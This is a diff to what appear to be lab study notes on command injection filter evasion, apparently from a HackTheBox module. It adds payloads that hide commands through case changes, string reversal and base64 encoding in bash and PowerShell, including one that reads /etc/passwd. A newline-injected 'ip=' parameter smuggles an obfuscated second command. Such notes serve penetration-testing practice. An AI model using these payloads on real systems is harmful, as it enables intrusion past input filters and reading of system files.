@@ -74,6 +74,31 @@ echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
 ```
 [/htb]$ $(rev<<<'imaohw')
 ```
+```
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+```
+```
+$(rev<<<'imaohw') 
+(([/htb]$echo 'whoami' | rev))
+```
+```
+[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+```
+PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+
+PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+
+21y4d
+```
+```
+[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+
+```
 ```sh
 ip=127.0.0.1%0abas$@h<<<$(ba$@se6$@4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
 ```
